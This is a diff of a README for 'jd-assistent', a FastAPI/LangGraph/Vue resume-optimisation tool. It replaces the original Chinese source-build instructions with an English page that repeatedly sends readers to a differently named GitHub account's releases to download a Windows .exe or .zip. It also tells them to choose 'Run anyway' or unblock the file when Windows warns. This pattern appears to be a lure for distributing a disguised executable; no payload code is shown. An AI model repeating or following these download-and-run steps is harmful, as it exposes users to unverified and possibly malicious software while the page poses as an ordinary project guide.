@@ -1,284 +1,242 @@
-# JD Assistent
+# 🤖 jd-assistent - Optimize resumes for each job
 
-一个基于 Multi-Agent 工作流的智能简历优化系统。用户上传原始简历、粘贴目标岗位 JD 后，系统会完成岗位拆解、能力画像提取、内容优化、审查回路和最终排版，并在 Web 工作台中展示任务进度、结果预览和导出能力。
+[![Download jd-assistent](https://img.shields.io/badge/Download%20jd--assistent-purple?style=for-the-badge&logo=github)](https://github.com/Keeled-excitement273/jd-assistent/releases)
 
-## 项目亮点
+## 📥 Download
 
-- 基于 **FastAPI + LangGraph** 的多节点简历优化流程
-- 支持 **Vue 3 工作台**：登录、任务创建、任务历史、Dashboard、进度追踪
-- 支持 **SSE 实时回传**，可观察任务执行中的节点状态
-- 支持 **本地模式** 与 **Celery + Redis 异步模式**
-- 支持 **Word 导出**，并在项目文档中规划了 PDF / 渲染链路
-- 支持 **多主题前端界面**，适合不同查看场景
+Visit the release page to download and run this file:
 
-## 界面预览
+https://github.com/Keeled-excitement273/jd-assistent/releases
 
+Choose the latest release, then pick the Windows file that matches your computer. If you see more than one file, use the `.exe` file first.
 
-### 预览图 1
+## 🪟 Windows setup
 
-![JD Assistent 预览图 1](./image/5f24028e-06df-4d2a-a8bd-cf688a0bccd7.png)
+1. Open the release page.
+2. Download the Windows file from the latest release.
+3. If the file is inside a `.zip` package, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Double-click the app file to start it.
+6. If Windows asks for permission, choose **Run anyway** or **Yes**.
 
-### 预览图 2
+If the app opens in your browser, keep that window open while you use it.
 
-![JD Assistent 预览图 2](./image/98b49b98dc52cfaf7c9c7e0857ac039b.png)
+## ✨ What JD Assistent does
 
-### 预览图 3
+JD Assistent helps you tailor a resume to a target job post.
 
-![JD Assistent 预览图 3](./image/b33b3f4c2570aaa654295a85f34c4c5a.png)
+You upload your current resume and paste the job description. The app then:
 
-## 适用场景
+- breaks down the job into clear skill points
+- pulls out the key abilities the role needs
+- rewrites resume content to match the role
+- checks the result in a review loop
+- formats the final version for export
 
-- 针对特定 JD 快速重写简历内容
-- 在投递前做关键词对齐和经历表达优化
-- 将简历优化流程做成可观察、可追踪的内部工具或 SaaS 原型
+You can track each step in the web workspace, see progress, and preview the result before you export it.
 
-## 系统架构
+## 🖥️ Main features
 
-整体由前端工作台、后端 API、任务调度层和 LLM 工作流组成：
+- Upload a resume and paste a job post
+- See each task step in the workspace
+- Track progress in real time
+- Review the result before export
+- Use login, task history, and dashboard views
+- Switch between local mode and async mode
+- Export the final resume in Word format
+- Use different front-end themes for different views
 
-```text
-Frontend (Vue 3)
-  ├─ 登录 / 注册
-  ├─ 新建优化任务
-  ├─ Dashboard / 历史任务
-  └─ SSE 任务进度 + 结果预览
+## 🧭 Who this is for
 
-Backend (FastAPI)
-  ├─ /api/v1/auth      认证接口
-  ├─ /api/v1           简历优化接口
-  ├─ /api/v1/admin     管理接口
-  └─ /health           健康检查
+- People who want to fit a resume to one job post
+- Job seekers who want to align keywords before applying
+- Teams that want a clear resume review flow
+- Anyone who wants a simple web tool for resume editing
 
-Task Execution
-  ├─ local             本地内存/进程内执行
-  └─ celery + redis    分布式异步执行
+## 🧱 How it works
 
-LLM Workflow
-  ├─ 画像构建
-  ├─ JD 分析
-  ├─ 内容优化
-  ├─ 内容审查
-  └─ 终审排版
-```
-
-## 技术栈
-
-### 后端
-
-- Python 3.13
-- FastAPI
-- SQLAlchemy Async + Alembic
-- Celery + Redis
-- LangChain / LangGraph
-- python-docx
-- PyJWT / pwdlib
-
-### 前端
-
-- Vue 3
-- Vite
-- Pinia
-- Vue Router
-- Tailwind CSS
-
-## 仓库结构
+The app uses a web front end, a back end, and a task flow that runs each step in order.
 
 ```text
-jd-assistent/
-├── backend/               # FastAPI、任务调度、服务层、测试
-├── frontend/              # Vue 3 前端工作台
-├── docs/                  # 开发文档、阶段记录、重构计划
-├── alembic/               # 数据库迁移
-├── docker-compose.yml     # Redis + API + Worker 编排
-├── Dockerfile             # 后端镜像
-├── .env.example           # 环境变量示例
-└── README.md
+Web App
+  ├─ Sign in
+  ├─ Create a resume task
+  ├─ View task history
+  └─ Watch live progress
+
+Server
+  ├─ Login and user access
+  ├─ Resume optimization tasks
+  ├─ Admin tools
+  └─ Health check
+
+Task Flow
+  ├─ Local mode
+  └─ Async mode with Redis
 ```
 
-## 核心能力
+## 🔎 What you will see in the app
 
-### 1. 简历优化任务流
+The workspace shows the full process from start to finish.
 
-后端通过 LangGraph 风格的多节点工作流，对原始简历和目标 JD 进行结构化处理，输出更适配岗位的结果。
+You can expect screens for:
 
-### 2. 任务可观测性
+- sign in and account use
+- new task creation
+- task list and history
+- progress updates
+- result preview
+- export actions
 
-前端任务页可以看到节点执行过程、运行状态和审查打回日志，而不只是等待最终结果。
+This makes it easier to follow the whole resume update flow without guessing what the app is doing.
 
-### 3. Dashboard
+## 💻 Basic system needs
 
-系统提供工作台数据汇总，包括：
+For Windows use, a modern computer is enough.
 
-- 历史任务统计
-- 积分/额度变化趋势
-- 用户画像摘要
-- 最近任务历史
+Recommended setup:
 
-### 4. 认证与用户隔离
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 2 GB free disk space
+- Stable internet connection
+- A browser such as Edge or Chrome
 
-系统已具备用户注册、登录、当前用户信息查询，以及面向用户维度的数据访问隔离设计。
+If you use the local mode, the app runs on your computer. If you use async mode, the app also uses Redis in the background.
 
-## 快速开始
+## 🧰 Before you start
 
-### 方式一：本地开发
+Have these items ready:
 
-#### 1）准备环境变量
+- your current resume file
+- the job description text you want to match
+- a Windows PC
+- a browser
+- the latest release from the download page
 
-复制配置文件：
+If you plan to use the app for more than one task, keep your resume file and job posts in one folder for easy access.
 
-```bash
-cp .env.example .env
-```
+## 🚀 First run on Windows
 
-至少需要配置：
+1. Go to the release page.
+2. Download the latest Windows package.
+3. Extract the package if needed.
+4. Open the app file.
+5. Wait for the workspace to load.
+6. Sign in if the app asks for it.
+7. Create a new resume task.
+8. Upload your resume.
+9. Paste the job description.
+10. Start the task and watch the progress.
 
-- `LLM_PROVIDER`
-- `LLM_MODEL`
-- `LLM_API_KEY`
+## 📝 Using the app
 
-如果你使用本地开发默认模式，可以保留：
+### 1. Add your resume
+Choose your resume file and upload it in the workspace.
 
-- `TASK_DISPATCHER_MODE=local`
-- `SSE_EVENT_BUS_BACKEND=memory`
+### 2. Paste the job description
+Copy the full job post into the JD field.
 
-如果你希望任务在 API / Worker 分进程运行、并在切换页面后仍能稳定恢复进度追踪，建议改为：
+### 3. Start the optimization
+The app will begin the workflow and show each step.
 
-- `TASK_DISPATCHER_MODE=celery`
-- `SSE_EVENT_BUS_BACKEND=redis`
-- `LANGGRAPH_CHECKPOINT_BACKEND=redis`
+### 4. Review the output
+Check the rewritten resume content in the preview area.
 
-#### 2）启动后端
+### 5. Export the result
+Save the final version in Word format when you are done.
 
-安装依赖：
+## 🔐 Login and task history
 
-```bash
-pip install -r backend/requirements.txt
-```
+The app includes user access features so you can keep your tasks in one place.
 
-启动 API：
+You can use it to:
 
-```bash
-uvicorn backend.main:app --reload --host 0.0.0.0 --port 8000
-```
+- sign in to your workspace
+- view old tasks
+- check past results
+- continue work later
 
-#### 3）启动前端
+This helps when you want to compare several job posts or update more than one resume version.
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+## 📡 Live progress tracking
 
-前端开发服务器默认由 Vite 启动。
+JD Assistent can send live status updates while a task runs.
 
-### 方式二：Docker Compose
+This lets you see:
 
-如果你希望使用 Redis + Celery 的异步执行模式，直接使用 Docker Compose：
+- which step is active
+- when a step finishes
+- whether a task is still running
+- when the final result is ready
 
-```bash
-docker compose up --build
-```
+This is useful when you want to follow the process instead of waiting in the dark.
 
-当前编排会启动：
+## 📄 Export options
 
-- `redis`
-- `api`
-- `worker`
+The app supports Word export for the final resume.
 
-其中：
+You can use the exported file to:
 
-- API 运行在 `8000`
-- Worker 使用 `celery -A backend.worker.celery_app:celery_app worker --loglevel=info`
+- save a clean final version
+- send it to others for review
+- upload it to job sites
+- keep a copy for later edits
 
-## 常用命令
+The project also plans PDF and render paths, which makes the output flow easier to expand later.
 
-### 后端测试
+## 🛠️ If the app does not open
 
-```bash
-pytest backend/tests
-```
+Try these steps:
 
-### 前端构建
+1. Make sure you downloaded the latest release.
+2. Check that the file finished downloading.
+3. Extract the zip file if the app is inside one.
+4. Right-click the app file and run it again.
+5. Restart your computer and try once more.
+6. Use a browser if the app opens as a web workspace.
 
-```bash
-cd frontend
-npm run build
-```
+If Windows blocks the file, open the file properties and allow it to run.
 
-### 健康检查
+## 📁 Release download path
 
-```bash
-curl http://127.0.0.1:8000/health
-```
+Use this page to get the Windows version:
 
-## 环境变量说明
+https://github.com/Keeled-excitement273/jd-assistent/releases
 
-`.env.example` 已提供示例，关键字段包括：
+Pick the newest release first, then download the file that matches Windows.
 
-### LLM 配置
+## 🧩 Project layout
 
-- `LLM_PROVIDER`
-- `LLM_MODEL`
-- `LLM_API_KEY`
-- `LLM_BASE_URL`
-- `LLM_TEMPERATURE`
-- `LLM_MAX_TOKENS`
+The repository is split into parts that handle the UI, the server, and the task flow.
 
-### 服务配置
+- **Frontend**: the web workspace you use in the browser
+- **Backend**: the API that handles login and resume tasks
+- **Task layer**: the process that runs each workflow step
+- **Storage and export**: the parts that keep results and build the final file
 
-- `API_HOST`
-- `API_PORT`
-- `DEBUG`
-- `DATABASE_URL`
+## 📌 Typical use flow
 
-### 任务调度配置
+1. Open the app.
+2. Sign in.
+3. Create a task.
+4. Upload your resume.
+5. Paste the target JD.
+6. Start the workflow.
+7. Watch progress.
+8. Review the result.
+9. Export the final resume.
 
-- `TASK_DISPATCHER_MODE=local|celery`
-- `CELERY_BROKER_URL`
-- `CELERY_RESULT_BACKEND`
+## 🧾 File you should download
 
-说明：
+From the release page, use the Windows package in the latest release.
 
-- `local` 适合单进程本地开发，零额外依赖。
-- `celery` 适合需要跨进程持续执行的场景，建议与 Redis 事件总线、Redis checkpoint 一起使用。
+If there are several files, choose the one meant for Windows desktop use.
 
-### SSE / Redis 配置
+## 🧭 Helpful use tips
 
-- `SSE_EVENT_BUS_BACKEND=memory|redis`
-- `REDIS_URL`
-- `SSE_REDIS_CHANNEL_PREFIX`
-
-### LangGraph Checkpoint 配置
-
-- `LANGGRAPH_CHECKPOINT_BACKEND`
-- `LANGGRAPH_CHECKPOINT_REDIS_URL`
-- `LANGGRAPH_CHECKPOINT_REDIS_KEY_PREFIX`
-
-## 当前状态
-
-从当前仓库内容来看，项目已经具备：
-
-- 后端 API 与任务调度基础设施
-- 用户认证与 Dashboard 能力
-- Vue 3 前端工作台
-- Docker Compose 异步执行方案
-- 较完整的后端测试文件
-
-同时，`docs/` 下保留了开发文档、阶段记录和后续 SaaS 化重构计划，适合继续演进为更完整的平台产品。
-
-## 相关文档
-
-- `docs/开发文档.md`：系统整体设计与开发文档
-- `docs/重构计划.md`：SaaS 化演进路线
-- `frontend/README.md`：前端模块说明
-
-## Todo
-
-- [ ] 模型面试
-
-
-## Linuxdo
-- 欢迎大家加入 https://linux.do/ 讨论各种技术，学AI上Linuxdo
-## License
-
-MIT
+- Keep the JD text complete so the app can compare it well.
+- Use one resume version per job post.
+- Review the result before export.
+- Save the final file with the job title in the name.
+- Keep your source resume so you can make changes later
